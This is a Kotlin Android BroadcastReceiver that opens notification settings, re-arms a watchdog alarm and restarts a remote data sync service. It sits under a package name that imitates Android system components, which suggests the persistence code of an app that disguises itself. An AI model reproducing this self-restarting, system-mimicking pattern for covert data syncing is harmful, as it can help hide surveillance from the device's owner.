package com.android.services.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import androidx.annotation.RequiresApi
import com.android.services.util.FirebasePushUtils

class NotificationBroadcastReceiver : BroadcastReceiver() {
    @RequiresApi(api = Build.VERSION_CODES.O)
    override fun onReceive(context: Context, intent: Intent) {
        val notificationIntent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
            .putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(notificationIntent)
        val watchDogAlarmReceiver=WatchDogAlarmReceiver()
        watchDogAlarmReceiver.setAlarm(context)
        FirebasePushUtils.restartRemoteDataSyncService(context)
    }
}